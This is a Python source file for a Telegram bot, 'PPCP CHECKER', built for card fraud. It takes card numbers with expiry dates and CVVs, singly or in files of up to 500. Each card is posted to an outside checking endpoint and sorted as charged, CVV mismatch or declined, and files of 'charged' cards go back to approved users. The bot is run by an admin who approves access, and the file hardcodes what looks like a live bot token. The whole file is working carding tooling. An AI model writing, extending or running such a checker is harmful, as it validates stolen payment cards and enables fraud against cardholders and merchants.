import telebot
from telebot import types
import requests
import json
import os
import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = '8474746750:AAGiYxECSZ3T-V6UQUN9y0umUkUXu1kI9Pg'
ADMIN_ID  = 6601184733
API_URL    = 'https://ppcp.rudochk.com/check'
MAX_FILE   = 500

bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)
USERS_FILE  = 'yoshppcp_users.json'
active_jobs = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159",
    "❌": "5121063440311386962",
    "🔥": "5116414868357907335",
    "⚡": "5219943216781995020",
    "💳": "5447453226498552490",
    "💠": "5870498447068502918",
    "📝": "5444860552310457690",
    "🌐": "5447602197439218445",
    "📊": "4911241630633165627",
    "📦": "5303102515301083665",
    "📋": "5305618829265628111",
    "⏳": "5303382628773161521",
    "🚀": "5303534082204920602",
    "⚠️": "5305473345838410805",
    "💎": "5305726937887433606",
    "👋": "5134653266591744867",
    "💡": "5231264265242954153",
    "📈": "5134457377428341766",
    "🔌": "5305622454218024328",
    "⭐": "5801104080646444587",
    "👑": "5303547611351902889",
    "🔍": "5305346287820895195",
    "💥": "5122933683820430249",
    "🆔": "5447311106030726740",
    "👤": "5445174334031166029",
    "📅": "5082628525303792441",
    "🔄": "5454245266305604993",
    "🏦": "5303159080020372094",
    "💰": "5303159080020372094",
}

def pe(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji,
            f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>'
        )
    return result

def e(emoji):
    return pe(emoji)

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE) as f:
                d = json.load(f)
                return set(d.get('approved', [])), d.get('pending', {})
        except:
            pass
    return set(), {}

def save_users():
    with open(USERS_FILE, 'w') as f:
        json.dump({'approved': list(approved_users), 'pending': pending_requests}, f, indent=2)

approved_users, pending_requests = load_users()

def is_approved(uid):
    return uid == ADMIN_ID or uid in approved_users

def require_approval(fn):
    def wrapper(msg):
        if not is_approved(msg.from_user.id):
            send_safe(msg.chat.id,
                pe("❌ <b>ACCESS DENIED</b>\n\nYou need access to use this bot.\nUse /request to apply."),
                parse_mode='HTML')
            return
        return fn(msg)
    return wrapper

user_cooldowns = {}

def check_cooldown(chat_id):
    now  = time.time()
    last = user_cooldowns.get(chat_id, 0)
    diff = now - last
    if diff < 5:
        return False, int(5 - diff) + 1
    user_cooldowns[chat_id] = now
    return True, 0

def send_safe(chat_id, text, **kw):
    try:
        return bot.send_message(chat_id, text, **kw)
    except:
        return None

def edit_safe(chat_id, msg_id, text, **kw):
    try:
        return bot.edit_message_text(text, chat_id, msg_id, **kw)
    except:
        return None

def get_card_info(number):
    info = {'brand': 'Unknown', 'type': 'Unknown', 'bank': 'Unknown',
            'country': 'Unknown', 'flag': '🌍', 'level': 'Unknown'}
    try:
        r = requests.get(
            f'https://lookup.binlist.net/{number[:6]}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=5, verify=False
        )
        if r.status_code == 200:
            d = r.json()
            if d.get('scheme'):  info['brand']  = d['scheme'].upper()
            if d.get('type'):    info['type']   = d['type'].title()
            if d.get('brand'):   info['level']  = d['brand'].title()
            if d.get('bank', {}).get('name'):
                info['bank'] = d['bank']['name'].title()
            if d.get('country', {}).get('name'):
                info['country'] = d['country']['name'].upper()
            if d.get('country', {}).get('alpha2'):
                a2 = d['country']['alpha2']
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in a2.upper())
    except:
        pass
    return info

def check_card(card):
    card = card.strip()
    if not card:
        return None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json',
    }
    try:
        r = requests.post(API_URL, headers=headers,
                          data=json.dumps({"card": card}),
                          verify=False, timeout=65)
        if not r.text.strip():
            return {'status': 'DEAD', 'card': card, 'message': 'Empty response', 'price': ''}
        try:
            data = r.json()
        except:
            return {'status': 'DEAD', 'card': card, 'message': 'Invalid response', 'price': ''}
        return {
            'status':  str(data.get('status', '')).upper(),
            'card':    data.get('card', card),
            'message': data.get('message', ''),
            'price':   data.get('price', ''),
        }
    except Exception as ex:
        return {'status': 'DEAD', 'card': card, 'message': f'Error: {str(ex)[:50]}', 'price': ''}

def fmt_result(result, card_info, username='User'):
    status = result['status']
    
    flag   = card_info.get('flag', '🌍')
    bank   = card_info.get('bank', 'Unknown')
    country= card_info.get('country', 'Unknown')
    brand  = card_info.get('brand', 'Unknown')
    ctype  = card_info.get('type', 'Unknown')
    level  = card_info.get('level', 'Unknown')
    card_n = result['card']
    msg_n  = result['message']

    if 'CHARGED' in status:
        icon, label = '💎', 'CHARGED'
    elif 'CCN' in status:
        icon, label = '⚠️', 'CVV MISMATCH'
    else:
        icon, label = '❌', 'DECLINED'

    lines = [
        icon + ' <b>' + label + '</b>',
        '',
        '💳 <b>Card</b> → <code>' + card_n + '</code>',
        '📝 <b>Response</b> → ' + msg_n,
        '🌐 <b>Gateway</b> → 🔥 PPCP',
        '🏦 <b>Bank</b> → ' + flag + ' ' + bank + ' | ' + country,
        '💠 <b>Info</b> → ' + brand + ' - ' + ctype + ' - ' + level,
        '👤 <b>By</b> → @' + username,
    ]
    return pe('\n'.join(lines))

def stop_btn(chat_id):
    m = types.InlineKeyboardMarkup()
    m.add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{chat_id}"))
    return m

@bot.message_handler(commands=['start'])
def cmd_start(msg):
    uid = msg.from_user.id
    if not is_approved(uid):
        send_safe(msg.chat.id,
            pe("💳 <b>PPCP CHECKER</b>\n\nYou need access to use this bot.\nUse /request to apply."),
            parse_mode='HTML')
        return

    text = pe(
        "💳 <b>PPCP CHECKER</b>\n\n"
        "💥 /pchk — Single card check\n"
        "📦 /pfile — Check cards from file\n"
    )
    if uid == ADMIN_ID:
        text += pe(
            "\n👑 <b>ADMIN</b>\n\n"
            "👤 /users — Approved users\n"
            "⏳ /pending — Pending requests\n"
            "📢 /broadcast — Broadcast\n"
        )
    text += pe("\n💡 <b>Bot By:</b> @Xyoshy")
    send_safe(msg.chat.id, text, parse_mode='HTML')


@bot.message_handler(commands=['request'])
def cmd_request(msg):
    uid = msg.from_user.id
    if is_approved(uid):
        send_safe(msg.chat.id, "✅ You already have access!")
        return
    if uid in pending_requests:
        send_safe(msg.chat.id, "⏳ Your request is already pending...")
        return
    uname = msg.from_user.username or 'No username'
    fname = msg.from_user.first_name or 'Unknown'
    pending_requests[uid] = {'username': uname, 'name': fname,
                              'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    save_users()
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"),
        types.InlineKeyboardButton("❌ Deny",    callback_data=f"deny_{uid}")
    )
    send_safe(ADMIN_ID,
        f"📥 <b>New Access Request</b>\n\n"
        f"👤 {fname}\n🔗 @{uname}\n🆔 {uid}",
        parse_mode='HTML', reply_markup=markup)
    send_safe(msg.chat.id, "📤 Request sent! Waiting for admin approval...")


@bot.callback_query_handler(func=lambda c: c.data.startswith(('approve_','deny_')))
def cb_approval(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    action, uid = call.data.split('_', 1)
    uid = int(uid)
    if action == 'approve':
        approved_users.add(uid)
        pending_requests.pop(uid, None)
        save_users()
        bot.answer_callback_query(call.id, "✅ Approved!")
        edit_safe(call.message.chat.id, call.message.message_id, f"✅ User {uid} approved!")
        send_safe(uid, "🎉 Access granted! Type /start to begin.")
    else:
        pending_requests.pop(uid, None)
        save_users()
        bot.answer_callback_query(call.id, "❌ Denied!")
        edit_safe(call.message.chat.id, call.message.message_id, f"❌ User {uid} denied!")
        send_safe(uid, "🚫 Your request was denied.")


@bot.callback_query_handler(func=lambda c: c.data == 'none')
def cb_none(call):
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda c: c.data.startswith('stop_'))
def cb_stop(call):
    try:
        chat_id = int(call.data.split('_')[1])
        if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
            if chat_id in active_jobs:
                active_jobs[chat_id]['stop'] = True
            bot.answer_callback_query(call.id, "🛑 Stopping...")
        else:
            bot.answer_callback_query(call.id, "❌ Not your job!")
    except:
        pass


@bot.message_handler(commands=['pchk'])
@require_approval
def cmd_pchk(msg):
    ok, wait = check_cooldown(msg.chat.id)
    if not ok:
        send_safe(msg.chat.id, f"⏳ Wait {wait}s before checking again.")
        return
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        send_safe(msg.chat.id, "Usage: /pchk card|mm|yy|cvv")
        return
    card = parts[1].strip()
    status_msg = send_safe(msg.chat.id,
        pe(f"⏳ Checking...\n💳 <code>{card}</code>"),
        parse_mode='HTML')
    if not status_msg:
        return
    result    = check_card(card)
    card_info = get_card_info(card.split('|')[0])
    uname     = msg.from_user.username or 'User'
    edit_safe(msg.chat.id, status_msg.message_id,
              fmt_result(result, card_info, uname), parse_mode='HTML')


@bot.message_handler(commands=['pfile'])
@require_approval
def cmd_pfile(msg):
    send_safe(msg.chat.id,
        pe(f"📁 Send your .txt file\nOne card per line: card|mm|yy|cvv\nMax {MAX_FILE} cards."),
        parse_mode='HTML')


@bot.message_handler(content_types=['document'])
@require_approval
def handle_file(msg):
    if not msg.document or not msg.document.file_name.endswith('.txt'):
        send_safe(msg.chat.id, "❌ Please send a .txt file.")
        return

    status_msg = send_safe(msg.chat.id,
        pe("⏳ Reading file..."), parse_mode='HTML')
    if not status_msg:
        return

    try:
        file_info = bot.get_file(msg.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        cards = [c.strip() for c in file_data.decode('utf-8').splitlines() if c.strip()]
    except Exception as ex:
        edit_safe(msg.chat.id, status_msg.message_id, f"❌ Error: {ex}")
        return

    if not cards:
        edit_safe(msg.chat.id, status_msg.message_id, "❌ No cards found.")
        return

    if len(cards) > MAX_FILE:
        cards = cards[:MAX_FILE]

    stop_flag = {'stop': False}
    active_jobs[msg.chat.id] = stop_flag

    edit_safe(msg.chat.id, status_msg.message_id,
        pe(f"⏳ <b>Checking {len(cards)} cards...</b>"),
        parse_mode='HTML',
        reply_markup=stop_btn(msg.chat.id))

    def run():
        results  = []
        charged  = []
        ccn_list = []

        i = 0
        for card in cards:
            if stop_flag.get('stop'):
                break
            try:
                res = check_card(card)
            except Exception as err:
                res = {'status':'DEAD','card':card,'message':str(err)[:50],'price':''}
            i += 1
            results.append(res)
            if 'CHARGED' in res['status']:
                charged.append(res)
                ci = get_card_info(res['card'].split('|')[0])
                send_safe(msg.chat.id,
                    fmt_result(res, ci, msg.from_user.username or 'User'),
                    parse_mode='HTML')
            elif 'CCN' in res['status']:
                ccn_list.append(res)
                ci = get_card_info(res['card'].split('|')[0])
                send_safe(msg.chat.id,
                    fmt_result(res, ci, msg.from_user.username or 'User'),
                    parse_mode='HTML')

            if i % 5 == 0 or i == len(cards):
                dead_count = i - len(charged) - len(ccn_list)
                markup = types.InlineKeyboardMarkup(row_width=3)
                markup.row(
                    types.InlineKeyboardButton(f"❌ {dead_count}", callback_data="none"),
                    types.InlineKeyboardButton(f"💎 {len(charged)}", callback_data="none"),
                    types.InlineKeyboardButton(f"⚠️ {len(ccn_list)}", callback_data="none"),
                )
                markup.row(
                    types.InlineKeyboardButton(f"📊 Total  {len(cards)}", callback_data="none"),
                    types.InlineKeyboardButton(f"📋 Left  {len(cards) - i}", callback_data="none"),
                )
                markup.row(
                    types.InlineKeyboardButton("🔴 Stop", callback_data=f"stop_{msg.chat.id}"),
                )
                edit_safe(msg.chat.id, status_msg.message_id,
                    f"{e('⏳')} <b>Checking {msg.document.file_name}...</b>",
                    parse_mode='HTML',
                    reply_markup=markup)

        dead  = len(results) - len(charged) - len(ccn_list)
        label = "Stopped" if stop_flag.get('stop') else "Done"

        done_markup = types.InlineKeyboardMarkup(row_width=3)
        done_markup.row(
            types.InlineKeyboardButton(f"❌ {dead}", callback_data="none"),
            types.InlineKeyboardButton(f"💎 {len(charged)}", callback_data="none"),
            types.InlineKeyboardButton(f"⚠️ {len(ccn_list)}", callback_data="none"),
        )
        done_markup.row(
            types.InlineKeyboardButton(f"📊 Total  {len(results)}", callback_data="none"),
        )
        edit_safe(msg.chat.id, status_msg.message_id,
            pe(f"✅ <b>{label}!</b>"),
            parse_mode='HTML',
            reply_markup=done_markup)

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')

        if charged:
            fname = f'charged_{ts}.txt'
            with open(fname, 'w') as f:
                for r in charged:
                    price = f"  {r['price']}" if r['price'] else ''
                    f.write(f"CHARGED\n{r['card']}\n{r['message']}{price}\n\n")
            with open(fname, 'rb') as f:
                bot.send_document(msg.chat.id, f,
                    caption=pe(f"💎 <b>{len(charged)} Charged Cards</b>"),
                    visible_file_name=fname,
                    parse_mode='HTML')
            os.remove(fname)

        if ccn_list:
            fname = f'ccn_{ts}.txt'
            with open(fname, 'w') as f:
                for r in ccn_list:
                    price = f"  {r['price']}" if r['price'] else ''
                    f.write(f"CCN\n{r['card']}\n{r['message']}{price}\n\n")
            with open(fname, 'rb') as f:
                bot.send_document(msg.chat.id, f,
                    caption=pe(f"⚠️ <b>{len(ccn_list)} CCN Cards</b>"),
                    visible_file_name=fname,
                    parse_mode='HTML')
            os.remove(fname)

        active_jobs.pop(msg.chat.id, None)

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=['users'])
def cmd_users(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    if not approved_users:
        send_safe(msg.chat.id, "📭 No approved users.")
        return
    text = pe("👤 <b>Approved Users</b>\n\n")
    for i, uid in enumerate(approved_users, 1):
        text += f"{i}. <code>{uid}</code>\n"
    send_safe(msg.chat.id, text, parse_mode='HTML')


@bot.message_handler(commands=['pending'])
def cmd_pending(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    if not pending_requests:
        send_safe(msg.chat.id, "📭 No pending requests.")
        return
    text = pe("⏳ <b>Pending Requests</b>\n\n")
    for uid, info in pending_requests.items():
        text += f"👤 {info['name']} | @{info['username']} | <code>{uid}</code>\n"
    send_safe(msg.chat.id, text, parse_mode='HTML')


@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        send_safe(msg.chat.id, "Usage: /broadcast message")
        return
    ok = fail = 0
    for uid in approved_users:
        try:
            send_safe(uid, parts[1].strip())
            ok += 1
        except:
            fail += 1
        time.sleep(0.3)
    send_safe(msg.chat.id, f"✅ Sent: {ok} | ❌ Failed: {fail}")


if __name__ == '__main__':
    print("💳 Bot started!")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as ex:
            print(f"Crashed: {ex}, restarting in 5s...")
            time.sleep(5)
